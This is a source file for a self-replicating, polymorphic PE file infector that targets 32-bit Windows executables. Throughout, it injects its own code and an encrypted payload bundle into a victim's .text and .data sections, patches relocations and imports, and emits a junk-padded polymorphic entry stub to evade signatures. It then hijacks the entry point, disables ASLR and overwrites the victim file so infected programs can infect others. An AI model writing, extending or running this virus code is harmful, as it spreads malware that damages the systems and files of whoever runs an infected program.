// infector_pe.mc — Minimal self-replicating PE infector example
//
// Demonstrates polymorphic self-replication via in-section append injection.
// Code + preloader appended to .text; data + bundles + imports appended to .data.
// Section VAs shifted to make room; .reloc entries patched for shifted refs.
// Uses abs-mode (CALL [IAT]) — the natural PE import mechanism.
// No LDE, no disassembly, no code scattering.
// Self-replicating: carries own .mcb + genome, mutates each generation.
//
// Usage:
//   infector.exe --infect victim.exe
//   victim.exe --infect another.exe    (self-replication)

#include "../../compiler/backend/backend_mystc.mc"
#include "infector_common.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. PE Constants
//   2. PeInfo Struct
//   3. PE Helpers (validate, header parser, RVA→raw)
//   4. Import Helpers (.idata builder)
//   5. Relocation Processing (.reloc fixups)
//   6. Infect (expand .text and .data with payload)
//
// run_infect() and main() live in infector_common.mc (shared with ELF).
// =============================================================================

// =============================================================================
//
// PE Constants Module
//
// =============================================================================

// Infection marker stored in PE checksum field
int INF_MAGIC = 0x4D465332;  // "MFS2"

// ".data" section name as two LE dwords
int DATA_W0 = 0x7461642E;  // ".dat"
int DATA_W1 = 0x00000061;  // "a\0\0\0"

// =============================================================================
//
// PeInfo Struct Module
//
// =============================================================================

struct PeInfo {
    int pe_off;
    int image_base;
    int entry_rva;
    int sec_align;
    int file_align;
    int image_size;
    int num_sec;
    int opt_sz;
    int sec_start;
    int text_idx;
    int text_rva;
    int text_vsz;
    int text_raw;
    int text_rawsz;
    int data_idx;
    int data_rva;
    int data_vsz;
    int data_raw;
    int data_rawsz;
    int import_rva;
    int import_sz;
    int reloc_rva;
    int reloc_sz;
};

// =============================================================================
//
// PE Helpers Module
//
// validate_pe, load_pe_info, rva_to_raw — vanilla PE parsing.
//
// =============================================================================

int validate_pe(char* data, int size) {
    int pe_off;
    if (size < 0x100) { return 0; }
    if ((data[0] & 0xFF) != 0x4D) { return 0; }   // 'M'
    if ((data[1] & 0xFF) != 0x5A) { return 0; }   // 'Z'
    pe_off = read_i32(data, 0x3C);                 // e_lfanew
    if (pe_off < 0x40 || pe_off + 248 > size) { return 0; }
    if (read_i32(data, pe_off) != 0x00004550) { return 0; }   // "PE\0\0"
    if (read_i16(data, pe_off + 4) != 0x014C) { return 0; }   // Machine: i386
    if (read_i16(data, pe_off + 24) != 0x010B) { return 0; }  // PE32 magic
    return 1;
}

void load_pe_info(struct PeInfo* pi, char* data, int size) {
    int opt_off; int dd_off; int i; int sec_off; int flags;
    pi->pe_off = read_i32(data, 0x3C);
    pi->num_sec = read_i16(data, pi->pe_off + 6);
    pi->opt_sz = read_i16(data, pi->pe_off + 20);
    opt_off = pi->pe_off + 24;
    pi->entry_rva = read_i32(data, opt_off + 16);
    pi->image_base = read_i32(data, opt_off + 28);
    pi->sec_align = read_i32(data, opt_off + 32);
    pi->file_align = read_i32(data, opt_off + 36);
    pi->image_size = read_i32(data, opt_off + 56);
    dd_off = opt_off + 96;
    pi->import_rva = read_i32(data, dd_off + 8);
    pi->import_sz = read_i32(data, dd_off + 12);
    pi->reloc_rva = read_i32(data, dd_off + 40);
    pi->reloc_sz = read_i32(data, dd_off + 44);
    pi->sec_start = pi->pe_off + 24 + pi->opt_sz;
    // Find .text (first CODE section) and .data (by name)
    pi->text_idx = -1;
    pi->data_idx = -1;
    i = 0;
    while (i < pi->num_sec) {
        sec_off = pi->sec_start + i * 40;
        flags = read_i32(data, sec_off + 36);
        if ((flags & 0x20) != 0 && pi->text_idx == -1) { pi->text_idx = i; }   // IMAGE_SCN_CNT_CODE
        if (read_i32(data, sec_off) == DATA_W0 && read_i32(data, sec_off + 4) == DATA_W1) {
            pi->data_idx = i;
        }
        i = i + 1;
    }
    // Populate .text fields
    if (pi->text_idx >= 0) {
        sec_off = pi->sec_start + pi->text_idx * 40;
        pi->text_rva = read_i32(data, sec_off + 12);
        pi->text_vsz = read_i32(data, sec_off + 8);
        pi->text_raw = read_i32(data, sec_off + 20);
        pi->text_rawsz = read_i32(data, sec_off + 16);
    }
    // Populate .data fields
    if (pi->data_idx >= 0) {
        sec_off = pi->sec_start + pi->data_idx * 40;
        pi->data_rva = read_i32(data, sec_off + 12);
        pi->data_vsz = read_i32(data, sec_off + 8);
        pi->data_raw = read_i32(data, sec_off + 20);
        pi->data_rawsz = read_i32(data, sec_off + 16);
    }
}

int rva_to_raw(char* pe, int rva) {
    int pe_off; int num_sec; int opt_sz; int sec_start;
    int i; int s_rva; int s_vsz; int s_raw; int s_rawsz;
    pe_off = read_i32(pe, 0x3C);
    num_sec = read_i16(pe, pe_off + 6);
    opt_sz = read_i16(pe, pe_off + 20);
    sec_start = pe_off + 24 + opt_sz;
    i = 0;
    while (i < num_sec) {
        s_rva = read_i32(pe, sec_start + i * 40 + 12);
        s_vsz = read_i32(pe, sec_start + i * 40 + 8);
        s_rawsz = read_i32(pe, sec_start + i * 40 + 16);
        s_raw = read_i32(pe, sec_start + i * 40 + 20);
        // Use max(vsz, rawsz) for mapping range
        if (s_rawsz > s_vsz) { s_vsz = s_rawsz; }
        if (rva >= s_rva && rva < s_rva + s_vsz) {
            return s_raw + (rva - s_rva);
        }
        i = i + 1;
    }
    return -1;
}

// =============================================================================
//
// Import Helpers Module
//
// Builds the appended .idata area: IDT + INT + IAT + name strings.
//
// =============================================================================

int count_import_descriptors(char* pe, int import_rva) {
    int raw; int count;
    if (import_rva == 0) { return 0; }
    raw = rva_to_raw(pe, import_rva);
    if (raw < 0) { return 0; }
    count = 0;
    while (read_i32(pe, raw + count * 20 + 12) != 0 ||
           read_i32(pe, raw + count * 20 + 16) != 0) {
        count = count + 1;
    }
    return count;
}

int write_import_name(char* out, int off, char* name) {
    int len; int total;
    write_i16(out, off, 0);
    len = str_len(name);
    mem_copy(out + off + 2, name, len + 1);
    total = 2 + len + 1;
    if ((total % 2) != 0) { out[off + total] = 0; total = total + 1; }
    return total;
}

int calc_names_size(char* ext_info, int extern_count) {
    char* ptr; int i; int len; int entry_sz; int total;
    total = 0;
    ptr = ext_info + 4;
    i = 0;
    while (i < extern_count) {
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        len = str_len(ptr);
        entry_sz = 2 + len + 1;
        if ((entry_sz % 2) != 0) { entry_sz = entry_sz + 1; }
        total = total + entry_sz;
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        i = i + 1;
    }
    return total;
}

// Build import area at out[base_off]. Updates DD[1].
// Layout: [IAT][INT][names][dll_name][import_dir]
// Returns total bytes written.
int build_import_area(char* out, char* pe, int pe_off,
                      int base_off, int base_rva,
                      char* ext_info, int extern_count,
                      int import_rva, int old_import_count) {
    int iat_sz; int int_sz; int names_sz; int dll_sz; int dir_sz;
    int iat_off; int int_off; int names_off; int dll_off; int dir_off;
    int iat_rva; int int_rva; int names_rva; int dll_rva; int dir_rva;
    char* ptr; int i; int len; int entry_sz; int name_rel; int off;
    int old_raw; int total;

    iat_sz = (extern_count + 1) * 4;
    int_sz = (extern_count + 1) * 4;
    names_sz = calc_names_size(ext_info, extern_count);
    dll_sz = 14;
    dir_sz = (old_import_count + 2) * 20;

    iat_off = base_off;
    int_off = iat_off + iat_sz;
    names_off = int_off + int_sz;
    dll_off = names_off + names_sz;
    dir_off = dll_off + dll_sz;
    total = iat_sz + int_sz + names_sz + dll_sz + dir_sz;

    iat_rva = base_rva;
    int_rva = iat_rva + iat_sz;
    names_rva = int_rva + int_sz;
    dll_rva = names_rva + names_sz;
    dir_rva = dll_rva + dll_sz;

    mem_set(out + iat_off, 0, iat_sz);
    mem_set(out + int_off, 0, int_sz);

    ptr = ext_info + 4;
    name_rel = 0;
    i = 0;
    while (i < extern_count) {
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        len = str_len(ptr);
        entry_sz = 2 + len + 1;
        if ((entry_sz % 2) != 0) { entry_sz = entry_sz + 1; }
        write_i32(out, iat_off + i * 4, names_rva + name_rel);
        write_i32(out, int_off + i * 4, names_rva + name_rel);
        name_rel = name_rel + entry_sz;
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        i = i + 1;
    }

    ptr = ext_info + 4;
    off = names_off;
    i = 0;
    while (i < extern_count) {
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        off = off + write_import_name(out, off, ptr);
        while (ptr[0] != 0) { ptr = ptr + 1; }
        ptr = ptr + 1;
        i = i + 1;
    }

    mem_copy(out + dll_off, "kernel32.dll", 13);
    out[dll_off + 13] = 0;

    if (old_import_count > 0 && import_rva != 0) {
        old_raw = rva_to_raw(pe, import_rva);
        if (old_raw >= 0) {
            mem_copy(out + dir_off, pe + old_raw, old_import_count * 20);
        }
    }
    off = dir_off + old_import_count * 20;
    write_i32(out, off, int_rva);
    write_i32(out, off + 4, 0);
    write_i32(out, off + 8, 0);
    write_i32(out, off + 12, dll_rva);
    write_i32(out, off + 16, iat_rva);
    mem_set(out + off + 20, 0, 20);

    write_i32(out, pe_off + 24 + 96 + 8, dir_rva);
    write_i32(out, pe_off + 24 + 96 + 12, dir_sz);

    return total;
}

// =============================================================================
//
// Relocation Processing Module
//
// Fixes absolute references to VA-shifted sections.
//
// =============================================================================
// Walks the original .reloc table. For each HIGHLOW entry, checks if the
// referenced VA points to a shifted section and adjusts it.
// orig_rva_to_out converts original RVA to output file offset.

int orig_rva_to_out(char* pe, int rva, int text_end_raw, int data_end_raw,
                    int text_delta, int data_delta) {
    int raw;
    raw = rva_to_raw(pe, rva);
    if (raw < 0) { return -1; }
    if (raw >= data_end_raw) { return raw + text_delta + data_delta; }
    if (raw >= text_end_raw) { return raw + text_delta; }
    return raw;
}

void process_reloc(char* out, char* pe, struct PeInfo* pi,
                   int text_delta, int data_delta,
                   int thresh1, int thresh2,
                   int va_shift_text, int va_shift_data) {
    int reloc_raw; int pos; int block_rva; int block_sz;
    int num_entries; int i; int entry; int etype; int eoff;
    int patch_rva; int patch_out; int old_va; int old_rva; int shift;
    int text_end_raw; int data_end_raw;

    if (pi->reloc_rva == 0 || pi->reloc_sz == 0) { return; }
    reloc_raw = rva_to_raw(pe, pi->reloc_rva);
    if (reloc_raw < 0) { return; }

    text_end_raw = pi->text_raw + pi->text_rawsz;
    data_end_raw = pi->data_raw + pi->data_rawsz;

    pos = 0;
    while (pos < pi->reloc_sz) {
        block_rva = read_i32(pe, reloc_raw + pos);
        block_sz = read_i32(pe, reloc_raw + pos + 4);
        if (block_sz == 0) { return; }
        num_entries = (block_sz - 8) / 2;
        i = 0;
        while (i < num_entries) {
            entry = read_i16(pe, reloc_raw + pos + 8 + i * 2);
            etype = (entry >> 12) & 0xF;
            eoff = entry & 0xFFF;
            if (etype == 3) {
                patch_rva = block_rva + eoff;
                patch_out = orig_rva_to_out(pe, patch_rva, text_end_raw,
                                            data_end_raw, text_delta, data_delta);
                if (patch_out >= 0) {
                    old_va = read_i32(out, patch_out);
                    old_rva = old_va - pi->image_base;
                    shift = 0;
                    if (old_rva >= thresh1) { shift = shift + va_shift_text; }
                    if (old_rva >= thresh2) { shift = shift + va_shift_data; }
                    if (shift != 0) {
                        write_i32(out, patch_out, old_va + shift);
                    }
                }
            }
            i = i + 1;
        }
        pos = pos + block_sz;
    }
}

// =============================================================================
//
// Infect Module
//
// Expands the victim's .text and .data with the appended payload, fixes
// relocations, rewrites the entry point.
//
// =============================================================================
//
// Abs mode layout:
//   .text: [original code] [payload code] [import area] [entry preloader]
//   .data: [original data] [payload data section] [bundle data]

int infect_pe(char* victim_path, char* compiled, int compiled_sz,
              char* bundle_buf, int bundle_sz,
              int mcb_sz, int pay_sz, int gen_sz, int bundle_key) {
    char* pe; int pe_sz;
    struct PeInfo* pi;
    int entry_off; int code_sz; int data_sz;
    int extern_count; int ext_info_sz;
    char* code_ptr; char* data_ptr; char* ext_info;
    int n_data_fix; int n_ext_fix; int n_call_fix; int n_faddr_fix;
    char* df_tab; char* ef_tab;
    int text_append_sz; int data_append_sz;
    int text_new_rawsz; int data_new_rawsz;
    int text_delta; int data_delta;
    int va_shift_text; int va_shift_data;
    int thresh1; int thresh2;
    int import_area_sz; int iat_text_off; int preloader_text_off;
    int old_import_count;
    char* out; int out_sz;
    int new_data_rva;
    int header_align_pad;
    int header_n_desc;
    int header_total;

    // ---- 1. Read victim PE ----
    pe_sz = 0;
    pe = read_file(victim_path, &pe_sz);
    if (pe == 0) {
        print("ERR: cannot read "); print(victim_path); print("\n");
        return 1;
    }
    if (validate_pe(pe, pe_sz) == 0) {
        print("ERR: invalid PE\n"); free(pe); return 1;
    }
    pi = malloc(92);
    load_pe_info(pi, pe, pe_sz);
    if (pi->text_idx < 0 || pi->data_idx < 0) {
        print("ERR: missing .text or .data\n"); free(pe); free(pi); return 1;
    }
    if (pi->text_raw >= pi->data_raw) {
        print("ERR: unexpected section layout\n"); free(pe); free(pi); return 1;
    }

    // ---- 2. Check infection marker (checksum) ----
    if (read_i32(pe, pi->pe_off + 24 + 64) == INF_MAGIC) {
        print("SKIP: already infected\n");
        free(pe); free(pi); return 0;
    }

    print("Victim: "); print(victim_path);
    print(" ("); print_int(pe_sz); print(" bytes)\n");

    // ---- 3. Parse compiled output ----
    // Abs output: 36-byte header (9 u32 fields) + 4 fixup tables + code + data + extern_info
    // Header: entry, code_sz, data_sz, n_data_fix, n_ext_fix, n_call_fix, n_faddr_fix, ext_count, ext_info_sz
    // Call/faddr fixups are scatter-only — their relative offsets are already baked in code,
    // so an append infector skips them but does not re-apply.
    {
        int off;
        entry_off    = read_i32(compiled, 0);
        code_sz      = read_i32(compiled, 4);
        data_sz      = read_i32(compiled, 8);
        n_data_fix   = read_i32(compiled, 12);
        n_ext_fix    = read_i32(compiled, 16);
        n_call_fix   = read_i32(compiled, 20);
        n_faddr_fix  = read_i32(compiled, 24);
        extern_count = read_i32(compiled, 28);
        ext_info_sz  = read_i32(compiled, 32);
        off = 36;
        df_tab = compiled + off;  off = off + n_data_fix * 8;
        ef_tab = compiled + off;  off = off + n_ext_fix * 8;
        off = off + n_call_fix * 8;
        off = off + n_faddr_fix * 8;
        code_ptr = compiled + off;  off = off + code_sz;
        data_ptr = compiled + off;  off = off + data_sz;
        ext_info = compiled + off;
    }

    print("  code="); print_int(code_sz);
    print(" data="); print_int(data_sz);
    print(" ext="); print_int(extern_count); print("\n");

    // ---- 4. Compute append sizes ----
    old_import_count = count_import_descriptors(pe, pi->import_rva);
    {
        int names_sz; int iat_sz; int int_sz;
        names_sz = calc_names_size(ext_info, extern_count);
        iat_sz = (extern_count + 1) * 4;
        int_sz = (extern_count + 1) * 4;
        import_area_sz = iat_sz + int_sz + names_sz + 14 + (old_import_count + 2) * 20;
    }

    // Code + preloader in .text; data + bundles + imports in .data
    // IAT must be in writable .data (PE loader writes resolved pointers)
    iat_text_off = -1;
    preloader_text_off = code_sz;
    // text_append: the recompiled program code + the polymorphic preloader.
    // Preloader worst case:
    //   4 poly_junk slots × up to 6 ops × 6 bytes (LEA pair) = 144
    //   + save/restore/entry_call/oep_xfer up to 7 each       =  28
    //   ≈ 172 bytes. Round to 256 for margin.
    text_append_sz = code_sz + 256;

    // Reserve room for the BundleHeader + descriptors between the (encrypted)
    // bundle bytes and the import area. 4-aligned so bundle_open / bundle_get
    // int loads hit aligned addresses.
    header_align_pad = (4 - ((pi->data_vsz + data_sz + bundle_sz) & 3)) & 3;
    header_n_desc = 1;                                                       // BC_CARRIER
    if (pay_sz > 0) { header_n_desc = header_n_desc + 1; }                    // BC_PAYLOAD
    header_n_desc = header_n_desc + 1;                                       // BC_GENOME
    header_total = 32 + header_n_desc * 16;

    data_append_sz = data_sz + bundle_sz + header_align_pad + header_total + import_area_sz;

    // ---- 5. Compute VA shifts and raw deltas ----
    va_shift_text = align_up(pi->text_vsz + text_append_sz, pi->sec_align)
                  - align_up(pi->text_vsz, pi->sec_align);

    // thresh1 = first section after .text (original RVA)
    thresh1 = 0;
    if (pi->text_idx + 1 < pi->num_sec) {
        thresh1 = read_i32(pe, pi->sec_start + (pi->text_idx + 1) * 40 + 12);
    }

    va_shift_data = 0;
    thresh2 = 0;
    if (data_append_sz > 0 && pi->data_idx + 1 < pi->num_sec) {
        va_shift_data = align_up(pi->data_vsz + data_append_sz, pi->sec_align)
                      - align_up(pi->data_vsz, pi->sec_align);
        thresh2 = read_i32(pe, pi->sec_start + (pi->data_idx + 1) * 40 + 12);
    }

    text_new_rawsz = align_up(pi->text_vsz + text_append_sz, pi->file_align);
    text_delta = text_new_rawsz - pi->text_rawsz;
    if (text_delta < 0) { text_delta = 0; text_new_rawsz = pi->text_rawsz; }

    data_new_rawsz = pi->data_rawsz;
    data_delta = 0;
    if (data_append_sz > 0) {
        data_new_rawsz = align_up(pi->data_vsz + data_append_sz, pi->file_align);
        data_delta = data_new_rawsz - pi->data_rawsz;
        if (data_delta < 0) { data_delta = 0; data_new_rawsz = pi->data_rawsz; }
    }

    // ---- 6. Build output with raw shifts ----
    out_sz = pe_sz + text_delta + data_delta;
    out = malloc(out_sz);
    mem_set(out, 0, out_sz);
    {
        int chunk1_end; int chunk2_start; int chunk2_end; int chunk3_start;
        // Chunk 1: headers + .text raw data (no shift)
        chunk1_end = pi->text_raw + pi->text_rawsz;
        mem_copy(out, pe, chunk1_end);

        // Chunk 2: between .text end and .data end (shifted by text_delta)
        chunk2_start = pi->text_raw + pi->text_rawsz;
        chunk2_end = pi->data_raw + pi->data_rawsz;
        mem_copy(out + chunk2_start + text_delta, pe + chunk2_start,
                 chunk2_end - chunk2_start);

        // Chunk 3: after .data (shifted by text_delta + data_delta)
        chunk3_start = pi->data_raw + pi->data_rawsz;
        if (chunk3_start < pe_sz) {
            mem_copy(out + chunk3_start + text_delta + data_delta,
                     pe + chunk3_start, pe_sz - chunk3_start);
        }
    }

    // ---- 7. Process .reloc to fix references to shifted sections ----
    if (va_shift_text > 0 || va_shift_data > 0) {
        process_reloc(out, pe, pi, text_delta, data_delta,
                      thresh1, thresh2, va_shift_text, va_shift_data);
    }

    // ---- 8. Update section headers ----
    {
        int i; int hdr; int old_r; int old_va; int shift_r; int shift_v;
        i = 0;
        while (i < pi->num_sec) {
            hdr = pi->sec_start + i * 40;
            // Raw offset shift
            old_r = read_i32(pe, hdr + 20);
            shift_r = 0;
            if (old_r > pi->text_raw) { shift_r = shift_r + text_delta; }
            if (old_r > pi->data_raw) { shift_r = shift_r + data_delta; }
            write_i32(out, hdr + 20, old_r + shift_r);
            // VA shift
            old_va = read_i32(pe, hdr + 12);
            shift_v = 0;
            if (old_va >= thresh1 && thresh1 > 0) { shift_v = shift_v + va_shift_text; }
            if (old_va >= thresh2 && thresh2 > 0) { shift_v = shift_v + va_shift_data; }
            write_i32(out, hdr + 12, old_va + shift_v);
            // .text: update vsz + rawsz
            if (i == pi->text_idx) {
                write_i32(out, hdr + 8, pi->text_vsz + text_append_sz);
                write_i32(out, hdr + 16, text_new_rawsz);
            }
            // .data: update vsz + rawsz
            if (i == pi->data_idx && data_append_sz > 0) {
                write_i32(out, hdr + 8, pi->data_vsz + data_append_sz);
                write_i32(out, hdr + 16, data_new_rawsz);
            }
            i = i + 1;
        }
    }

    // ---- 9. Update DataDirectory RVAs for shifted sections ----
    {
        int dd_base; int num_dd; int d; int dd_rva; int shift;
        dd_base = pi->pe_off + 24 + 96;
        num_dd = read_i32(out, pi->pe_off + 24 + 92);
        if (num_dd > 16) { num_dd = 16; }
        d = 0;
        while (d < num_dd) {
            dd_rva = read_i32(out, dd_base + d * 8);
            if (dd_rva != 0) {
                shift = 0;
                if (dd_rva >= thresh1 && thresh1 > 0) { shift = shift + va_shift_text; }
                if (dd_rva >= thresh2 && thresh2 > 0) { shift = shift + va_shift_data; }
                if (shift != 0) {
                    write_i32(out, dd_base + d * 8, dd_rva + shift);
                }
            }
            d = d + 1;
        }
    }

    // ---- 10. Append code to .text extension ----
    mem_copy(out + pi->text_raw + pi->text_vsz, code_ptr, code_sz);

    // ---- 11. Append data/bundles and build import area in .data extension ----
    new_data_rva = pi->data_rva + va_shift_text;
    {
        int dr;  // .data raw base in output (shifted)
        int iat_data_off;  // IAT offset within .data extension
        int ia_raw; int ia_rva;
        dr = pi->data_raw + text_delta;

        // Data + bundles + import area in .data
        if (data_sz > 0) {
            mem_copy(out + dr + pi->data_vsz, data_ptr, data_sz);
        }
        mem_copy(out + dr + pi->data_vsz + data_sz, bundle_buf, bundle_sz);
        iat_data_off = data_sz + bundle_sz + header_align_pad + header_total;

        // Emit BundleHeader + descriptors after the encrypted
        // bundle bytes. base_addr points at the bundle (XOR'd) and `key` is the
        // XOR key so bundle_open() decrypts in place on first call.
        {
            int hp_foff; int header_va; int hdi; int hboff;
            hp_foff = dr + pi->data_vsz + data_sz + bundle_sz + header_align_pad;
            header_va = pi->image_base + new_data_rva + pi->data_vsz + data_sz
                      + bundle_sz + header_align_pad;
            write_i32(out, hp_foff +  0, META_MAGIC);
            write_i32(out, hp_foff +  4, META_VERSION);
            write_i32(out, hp_foff +  8, header_total);
            write_i32(out, hp_foff + 12, header_n_desc);
            write_i32(out, hp_foff + 16, pi->image_base + new_data_rva + pi->data_vsz + data_sz);
            write_i32(out, hp_foff + 20, bundle_sz);
            write_i32(out, hp_foff + 24, bundle_key);
            write_i32(out, hp_foff + 28, 0);
            hdi = 0;
            hboff = 0;
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_CARRIER);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, mcb_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
            hdi = hdi + 1; hboff = hboff + mcb_sz;
            if (pay_sz > 0) {
                write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_PAYLOAD);
                write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
                write_i32(out, hp_foff + 32 + hdi*16 +  8, pay_sz);
                write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
                hdi = hdi + 1; hboff = hboff + pay_sz;
            }
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_GENOME);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, gen_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);

            // Patch g_bundle_header in the program's data section copy → header VA
            if (g_bundle_header_off >= 0) {
                write_i32(out, dr + pi->data_vsz + g_bundle_header_off, header_va);
            }
        }

        // Build import area in .data extension
        ia_raw = dr + pi->data_vsz + iat_data_off;
        ia_rva = new_data_rva + pi->data_vsz + iat_data_off;
        build_import_area(out, pe, pi->pe_off,
                          ia_raw, ia_rva, ext_info, extern_count,
                          pi->import_rva, old_import_count);

        // Fix old import descriptor RVAs + INT/IAT thunk entries for VA shift
        {
            int j; int d_off; int iat_sz; int int_sz; int names_sz; int dll_sz;
            int f0; int f12; int f16; int s;
            int oft_rva; int ft_rva; int arr_raw; int k; int thunk;
            iat_sz = (extern_count + 1) * 4;
            int_sz = (extern_count + 1) * 4;
            names_sz = calc_names_size(ext_info, extern_count);
            dll_sz = 14;
            d_off = ia_raw + iat_sz + int_sz + names_sz + dll_sz;
            j = 0;
            while (j < old_import_count) {
                // Shift descriptor RVAs
                f0 = read_i32(out, d_off + j * 20);
                f12 = read_i32(out, d_off + j * 20 + 12);
                f16 = read_i32(out, d_off + j * 20 + 16);
                s = 0;
                if (f0 >= thresh1 && thresh1 > 0) { s = va_shift_text; }
                if (f0 >= thresh2 && thresh2 > 0) { s = s + va_shift_data; }
                if (s > 0) { write_i32(out, d_off + j * 20, f0 + s); f0 = f0 + s; }
                s = 0;
                if (f12 >= thresh1 && thresh1 > 0) { s = va_shift_text; }
                if (f12 >= thresh2 && thresh2 > 0) { s = s + va_shift_data; }
                if (s > 0) { write_i32(out, d_off + j * 20 + 12, f12 + s); }
                s = 0;
                if (f16 >= thresh1 && thresh1 > 0) { s = va_shift_text; }
                if (f16 >= thresh2 && thresh2 > 0) { s = s + va_shift_data; }
                if (s > 0) { write_i32(out, d_off + j * 20 + 16, f16 + s); f16 = f16 + s; }

                // Fix INT (OFT) thunk entries — hint/name RVAs
                oft_rva = f0;
                if (oft_rva != 0) {
                    arr_raw = rva_to_raw(out, oft_rva);
                    if (arr_raw >= 0) {
                        k = 0;
                        thunk = read_i32(out, arr_raw + k * 4);
                        while (thunk != 0) {
                            if ((thunk & -2147483648) == 0) {
                                s = 0;
                                if (thunk >= thresh1 && thresh1 > 0) { s = s + va_shift_text; }
                                if (thunk >= thresh2 && thresh2 > 0) { s = s + va_shift_data; }
                                if (s > 0) { write_i32(out, arr_raw + k * 4, thunk + s); }
                            }
                            k = k + 1;
                            thunk = read_i32(out, arr_raw + k * 4);
                        }
                    }
                }
                // Fix IAT (FT) thunk entries — same values before loader resolution
                ft_rva = f16;
                if (ft_rva != 0) {
                    arr_raw = rva_to_raw(out, ft_rva);
                    if (arr_raw >= 0) {
                        k = 0;
                        thunk = read_i32(out, arr_raw + k * 4);
                        while (thunk != 0) {
                            if ((thunk & -2147483648) == 0) {
                                s = 0;
                                if (thunk >= thresh1 && thresh1 > 0) { s = s + va_shift_text; }
                                if (thunk >= thresh2 && thresh2 > 0) { s = s + va_shift_data; }
                                if (s > 0) { write_i32(out, arr_raw + k * 4, thunk + s); }
                            }
                            k = k + 1;
                            thunk = read_i32(out, arr_raw + k * 4);
                        }
                    }
                }
                j = j + 1;
            }
        }
    }  // end of step 11 block

    // ---- 12. Patch fixups ----
    {
        int i; int code_off; int doff; int slot; int addr;
        // Data fixups → absolute VA into .data extension
        i = 0;
        while (i < n_data_fix) {
            code_off = read_i32(df_tab, i * 8);
            doff     = read_i32(df_tab, i * 8 + 4);
            addr = pi->image_base + new_data_rva + pi->data_vsz + doff;
            write_i32(out, pi->text_raw + pi->text_vsz + code_off, addr);
            i = i + 1;
        }
        // Extern fixups → absolute VA of IAT slot in .data extension.
        // IAT is placed after [data][bundle][header_pad][META header].
        i = 0;
        while (i < n_ext_fix) {
            code_off = read_i32(ef_tab, i * 8);
            slot     = read_i32(ef_tab, i * 8 + 4);
            addr = pi->image_base + new_data_rva + pi->data_vsz + data_sz
                 + bundle_sz + header_align_pad + header_total + slot * 4;
            write_i32(out, pi->text_raw + pi->text_vsz + code_off, addr);
            i = i + 1;
        }
    }

    // ---- 13. Write polymorphic entry preloader ----
    // Skeleton: [junk] save_regs [junk] entry_call [junk] restore_regs [junk] oep_xfer
    // save_regs / restore_regs pick a 3-7 reg subset.
    // entry_call and oep_xfer pick byte-shape variants per emit_* helpers.
    {
        int s; int off; int preloader_va;
        int order[7]; int n_saved;
        int target_va; int oep_va;
        prng_seed(runtime_seed());
        s = pi->text_raw + pi->text_vsz + preloader_text_off;
        off = 0;
        preloader_va = pi->image_base + pi->text_rva + pi->text_vsz + preloader_text_off;
        target_va = pi->image_base + pi->text_rva + pi->text_vsz + entry_off;
        oep_va = pi->image_base + pi->entry_rva;

        off = poly_junk(out + s, off, -1);
        off = emit_save_regs(out + s, off, order, &n_saved);
        off = poly_junk(out + s, off, -1);
        off = emit_entry_call(out + s, off, target_va, preloader_va + off, 1);
        off = poly_junk(out + s, off, -1);
        off = emit_restore_regs(out + s, off, order, n_saved);
        off = poly_junk(out + s, off, -1);
        off = emit_oep_transfer(out + s, off, oep_va, preloader_va + off, 1);
    }

    // ---- 14. Update PE headers ----
    {
        int opt_off; int last_hdr; int last_rva; int last_vsz; int dc;
        opt_off = pi->pe_off + 24;

        // EntryPoint → preloader in .text extension
        write_i32(out, opt_off + 16, pi->text_rva + pi->text_vsz + preloader_text_off);

        // SizeOfImage
        last_hdr = pi->sec_start + (pi->num_sec - 1) * 40;
        last_rva = read_i32(out, last_hdr + 12);
        last_vsz = read_i32(out, last_hdr + 8);
        write_i32(out, opt_off + 56, align_up(last_rva + last_vsz, pi->sec_align));

        // Checksum = infection marker
        write_i32(out, opt_off + 64, INF_MAGIC);

        // Clear DynamicBase (ASLR) — we use absolute VAs
        dc = read_i16(out, opt_off + 70);
        write_i16(out, opt_off + 70, dc & 0xFFBF);  // clear DLLCHARACTERISTICS_DYNAMIC_BASE (0x40)
    }

    // ---- 15. Write output ----
    write_file(victim_path, out, out_sz);

    print("Infected: "); print(victim_path);
    print(" (+"); print_int(text_delta + data_delta);
    print(" bytes, VA shift=0x");
    print_hex(va_shift_text);
    if (va_shift_data > 0) { print("+0x"); print_hex(va_shift_data); }
    print(")\n");

    free(pe); free(pi); free(out);
    return 0;
}

